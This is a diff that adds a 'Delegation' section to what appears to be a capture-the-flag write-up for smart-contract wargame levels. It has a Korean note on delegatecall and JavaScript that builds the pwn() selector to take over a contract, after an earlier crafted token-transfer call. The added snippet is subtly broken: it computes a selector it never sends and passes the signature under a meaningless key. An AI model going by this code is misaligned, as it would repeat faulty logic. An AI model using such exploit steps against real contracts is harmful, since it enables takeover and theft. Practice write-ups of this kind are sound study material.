@@ -74,3 +74,12 @@ const valuePadded = value.toString(16).padStart(64, '0');
 const data = "0xa9059cbb" + toAddressPadded + valuePadded;
 await sendTransaction({from:player, to:contract.address, data});
 ```
+
+### Delegation
+delegatecall은 현재 컨트랙트의 상태와 delegatedContract의 로직을 사용함.
+```
+const functionSignature = 'pwn()';
+const functionSignatureHash = _ethers.utils.keccak256(_ethers.utils.toUtf8Bytes(functionSignature));
+const functionSelector = functionSignatureHash.slice(0, 10);
+await sendTransaction({from:player, to:contract.address, functionSignature});
+```
